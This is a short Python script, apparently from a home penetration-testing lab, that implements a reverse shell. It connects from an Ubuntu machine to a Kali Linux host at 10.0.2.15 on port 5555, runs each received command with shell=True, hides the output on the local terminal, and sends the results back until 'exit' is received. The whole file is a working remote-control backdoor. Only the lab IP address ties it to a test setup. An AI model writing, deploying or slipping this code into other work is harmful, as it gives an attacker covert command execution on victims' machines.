import socket
import subprocess

#Connecting to Kali Linux IP: 10.0.2.15 on port:5555
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.15", 5555))
s.send(("Connected!\n").encode('utf-8'))
command = None

#While command typed from Kali terminal is not exit, execute commands on Ubuntu terminal, and send results back.
while command != "exit":
    data_received = s.recv(1024)
    command = ((data_received).decode('utf-8')).replace("\n", "")
    #Do not display any output on Ubuntu terminal while commands execute 
    execute_comm = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = execute_comm.stdout.read()
    #Send result back to Kali terminal
    s.send(result)

#Close connection between Kali and Ubuntu
s.close()
